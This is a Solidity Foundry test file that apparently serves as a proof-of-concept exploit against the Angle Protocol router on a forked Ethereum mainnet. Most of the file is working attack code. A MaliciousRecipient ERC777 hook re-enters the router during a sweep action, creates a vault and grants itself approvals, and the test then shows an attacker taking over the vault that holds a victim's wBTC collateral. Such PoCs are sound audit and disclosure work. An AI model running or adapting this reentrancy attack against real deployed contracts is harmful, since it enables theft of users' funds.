// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console} from "forge-std/console.sol";
import "forge-std/Test.sol";
import "./StorageSlot.sol";

import "../src/AngleRouterMainnet/@openzeppelin/contracts/interfaces/IERC20.sol";
import "../src/AngleRouterMainnet/@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "../src/AngleRouterMainnet/@openzeppelin/contracts/token/ERC777/ERC777.sol";
import "../src/AngleRouterMainnet/@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol";
import "../src/AngleRouterMainnet/@openzeppelin/contracts/utils/introspection/IERC1820Registry.sol";

import "../src/AngleRouterMainnet/contracts/BaseRouter.sol";
import "../src/AngleRouterMainnet/contracts/implementations/mainnet/AngleRouterMainnet.sol";
import "../src/AngleRouterMainnet/contracts/interfaces/ISanToken.sol";
import "../src/AngleRouterMainnet/contracts/interfaces/IPerpetualManager.sol";
import "../src/AngleRouterMainnet/contracts/interfaces/IVeANGLE.sol";
import "../src/AngleRouterMainnet/contracts/interfaces/ISavingsRateIlliquid.sol";
import "../src/AngleRouterMainnet/contracts/interfaces/IStableMasterFront.sol";
import "../src/AngleRouterMainnet/contracts/interfaces/external/uniswap/IUniswapRouter.sol";
import "../src/AngleRouterMainnet/contracts/interfaces/external/IWETH9.sol";
import "../src/AngleRouterMainnet/contracts/interfaces/IVaultManager.sol";
import "../src/AngleRouterMainnet/contracts/interfaces/ISwapper.sol";
import "../src/AngleRouterMainnet/contracts/interfaces/ICoreBorrow.sol";
import "../src/AngleRouterMainnet/contracts/interfaces/IPoolManager.sol";
import "../src/AngleRouterMainnet/contracts/interfaces/IFeeDistributorFront.sol";
import "../src/AngleRouterMainnet/contracts/interfaces/ILiquidityGauge.sol";
import "../src/AngleRouterMainnet/contracts/interfaces/ITreasury.sol";

// foundry cheatsheet: https://github.com/foundry-rs/foundry/blob/master/forge/README.md#cheat-codes

interface IAngleRouter {
    function mixer(
        PermitType[] memory paramsPermit,
        ActionType[] calldata actions,
        bytes[] calldata data
    ) external;

    function mixerVaultManagerPermit(
        PermitVaultManagerType[] memory paramsPermitVaultManager,
        PermitType[] memory paramsPermit,
        ActionType[] calldata actions,
        bytes[] calldata data
    ) external payable virtual;
}

contract Common {
  IERC1820Registry internal constant _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
  address VAULT_MANAGER_ADDRESS = 0x241D7598BD1eb819c0E9dEd456AcB24acA623679;
  address VAULT_COLLATERAL = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599; //wBTC
  address VAULT_STABLECOIN = 0x1a7e4e63778B4f12a199C062f3eFdD288afCBce8; //agEUR
  address VAULT_COLLATERAL_HOLDER = 0x218B95BE3ed99141b0144Dba6cE88807c4AD7C09; //just a random account we'll prank to get wBTC from
  AngleRouterMainnet angleRouter = AngleRouterMainnet(payable(0x4579709627CA36BCe92f51ac975746f431890930));
  IVaultManagerFunctions vaultManager = IVaultManagerFunctions(VAULT_MANAGER_ADDRESS);
  IVaultManagerStorage vaultManagerStorage = IVaultManagerStorage(VAULT_MANAGER_ADDRESS);
}

interface ERC1820ImplementerInterface {
    /// @notice Indicates whether the contract implements the interface 'interfaceHash' for the address 'addr' or not.
    /// @param interfaceHash keccak256 hash of the name of the interface
    /// @param addr Address for which the contract will implement the interface
    /// @return ERC1820_ACCEPT_MAGIC only if the contract implements 'interfaceHash' for the address 'addr'.
    function canImplementInterfaceForAddress(bytes32 interfaceHash, address addr) external view returns(bytes32);
}
interface IERC721Receiver {
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4);
}

contract MockERC777 is ERC777 {
  constructor(address[] memory admins) ERC777 ("Test777", "TST", admins) {
    _mint(admins[0], 1000000000e18, "", "");
  }
}

// this is a malicious recipient, that will steal
contract MaliciousRecipient is IERC777Recipient, ERC1820ImplementerInterface, IERC721Receiver, Common {
    bytes32 constant internal ERC1820_ACCEPT_MAGIC = keccak256(abi.encodePacked("ERC1820_ACCEPT_MAGIC"));
    address erc777;
    address recipient;
    address approvalFor;

    constructor (address _erc777, address _recipient, address _approvalFor) {
      // _ERC1820_REGISTRY.setInterfaceImplementer(address(this), keccak256("ERC777TokensRecipient"), address(this));
      erc777 = _erc777;
      recipient = _recipient;
      approvalFor = _approvalFor;
    }

    function canImplementInterfaceForAddress(bytes32 interfaceHash, address addr) external view returns(bytes32) {
      return ERC1820_ACCEPT_MAGIC;
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
      return IERC721Receiver.onERC721Received.selector;
    }

    // this is the heart of the attack - if reenters the AngleRouter::mixer, and creates a new vault
    // Additionally it sets approvals, to bypass checks in AngleRouter and VaultManager
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external {
      vaultManager.createVault(address(this));

      // two first will be changed just after the transaction ends
      IERC721(VAULT_MANAGER_ADDRESS).setApprovalForAll(address(angleRouter), true); 
      IERC721(VAULT_MANAGER_ADDRESS).setApprovalForAll(approvalFor, true);
      IERC721(VAULT_MANAGER_ADDRESS).setApprovalForAll(recipient, true);
    }

    //using this function malicious user can get the vault for himself
    function getVaultOwnership(uint256 vaultID) external {
      require(msg.sender == recipient);
      IERC721(VAULT_MANAGER_ADDRESS).transferFrom(address(this), recipient, vaultID);
    }
}

contract AngleRouterMainnetPOC is Test, Common {
  address ALICE_ADDRESS = address(vm.addr(101));
  address BOB_ADDRESS = address(vm.addr(201));

  function testStealFromVault() public {
    vm.createSelectFork('https://rpc.ankr.com/eth');

    vm.label(address(angleRouter), "AngleRouter");
    vm.label(VAULT_MANAGER_ADDRESS, "VaultManager");
    vm.label(ALICE_ADDRESS, "Alice");
    vm.label(BOB_ADDRESS, "Bob");
    vm.label(VAULT_COLLATERAL, "wBTC");
    vm.label(VAULT_STABLECOIN, "agEUR");

    uint256 vaultIDBefore = vaultManagerStorage.vaultIDCount();

    vm.deal(ALICE_ADDRESS, 1 ether);
    vm.deal(BOB_ADDRESS, 1 ether);

    //setup ERC777, for ease of proof I created one
    address [] memory admins = new address [](1);

    admins [0] = BOB_ADDRESS;

    MockERC777 erc777 = new MockERC777(admins);
    //setup malicious recipient, that will renenter the router
    MaliciousRecipient maliciousERC777Recipient = new MaliciousRecipient(address(erc777), BOB_ADDRESS, ALICE_ADDRESS);
    vm.label(address(erc777), "ERC777");
    vm.label(address(maliciousERC777Recipient), "ERC777Recipient");
    vm.prank(BOB_ADDRESS);
    _ERC1820_REGISTRY.setInterfaceImplementer(BOB_ADDRESS, keccak256("ERC777TokensRecipient"), address(maliciousERC777Recipient));

    vm.prank(BOB_ADDRESS);
    erc777.transfer(ALICE_ADDRESS, 1e18); // just a mock, to add ERC777 for Alice, so that she can use it in the router

    // now we'll just get collateral from a random holder on mainnet - we'll need that in our test
    vm.startPrank(VAULT_COLLATERAL_HOLDER);

    IERC20(VAULT_COLLATERAL).transfer(ALICE_ADDRESS, 1e8);

    vm.stopPrank();

    assertEq(IERC20(VAULT_COLLATERAL).balanceOf(ALICE_ADDRESS), 1e8);
    assertEq(IERC20(VAULT_COLLATERAL).balanceOf(BOB_ADDRESS), 0); 

    vm.startPrank(ALICE_ADDRESS);
    IERC20(VAULT_COLLATERAL).approve(address(angleRouter), 1e8);
    erc777.approve(address(angleRouter), 1e18);

    PermitType[] memory aliceParamsPermitRouter = new PermitType[](0);
    ActionType[] memory aliceActionsRouter = new ActionType[](5);
    bytes[] memory aliceDataRouter = new bytes[](5);

    ActionBorrowType[] memory actionsBorrow = new ActionBorrowType[](1);
    bytes[] memory dataBorrow = new bytes[](1);
    ActionBorrowType[] memory actionsBorrow2 = new ActionBorrowType[](2);
    bytes[] memory dataBorrow2 = new bytes[](2);
    bytes memory repayData;

    // step 1 - Alice creates a vault
    actionsBorrow[0] = ActionBorrowType.createVault;
    dataBorrow[0] = abi.encode(ALICE_ADDRESS);

    // step 2 - in the meantime she transfers some erc777 tokens to Bob, which is a malicious actor

    // step 3 - at this time we already created a vault and granted Alice, so she can put her assets in malicious Bob's vault without issues. We set vaultID = 0, because that is default behaviour when working with new vaults
    actionsBorrow2[0] = ActionBorrowType.addCollateral;
    dataBorrow2[0] = abi.encode(uint256(0), uint256(1e8));

    actionsBorrow2[1] = ActionBorrowType.borrow;
    dataBorrow2[1] = abi.encode(uint256(0), uint256(5000e18)); // of course user wants to be at safe position not to get liquidated. In this case we allow Alice to borrow some AgTokens

    aliceActionsRouter[0] = ActionType.transfer;
    aliceDataRouter[0] = abi.encode(VAULT_COLLATERAL, address(angleRouter), 1e8);
    aliceActionsRouter[1] = ActionType.transfer;
    aliceDataRouter[1] = abi.encode(address(erc777), address(angleRouter), 1e18);
    aliceActionsRouter[2] = ActionType.borrower;
    aliceDataRouter[2] = abi.encode(VAULT_COLLATERAL, VAULT_MANAGER_ADDRESS,
                      address(angleRouter), address(0),
                      actionsBorrow, dataBorrow,
                      repayData
              );
    aliceActionsRouter[3] = ActionType.sweep; // just for simplicity the action used here is sweep
    aliceDataRouter[3] = abi.encode(address(erc777), 1e18, BOB_ADDRESS);// step 3 - reentrancy will happen here
    aliceActionsRouter[4] = ActionType.borrower;
    aliceDataRouter[4] = abi.encode(VAULT_COLLATERAL, VAULT_MANAGER_ADDRESS,
                      address(angleRouter), address(0),
                      actionsBorrow2, dataBorrow2,
                      repayData
              );

    PermitVaultManagerType[] memory paramsPermitVaultManager = new PermitVaultManagerType[] (0); // we set it to 0, as we mimic this behaviour via setApprovalForAll, just for easier PoCing. Normally if would first set positive approval, and then negative one to make this one transaction

    IERC721(VAULT_MANAGER_ADDRESS).setApprovalForAll(address(angleRouter), true);
    angleRouter.mixerVaultManagerPermit(paramsPermitVaultManager, aliceParamsPermitRouter, aliceActionsRouter, aliceDataRouter);
    IERC721(VAULT_MANAGER_ADDRESS).setApprovalForAll(address(angleRouter), false);
    vm.stopPrank();

    uint256 bobVaultID = vaultManagerStorage.vaultIDCount();

    vm.prank(BOB_ADDRESS);
    maliciousERC777Recipient.getVaultOwnership(bobVaultID);

    assertEq(vaultIDBefore + 2, bobVaultID);
    assertEq(IERC721(VAULT_MANAGER_ADDRESS).ownerOf(bobVaultID), BOB_ADDRESS);

    (uint256 collateralAmountBob, uint256 normalizedDebtBob) = vaultManagerStorage.vaultData(bobVaultID);

    // Bob received all the funds
    assertEq(collateralAmountBob, 1e8);
    assertTrue(normalizedDebtBob < 5000e18 && normalizedDebtBob > 490e18);//some space for rounding down and fees

  }
}
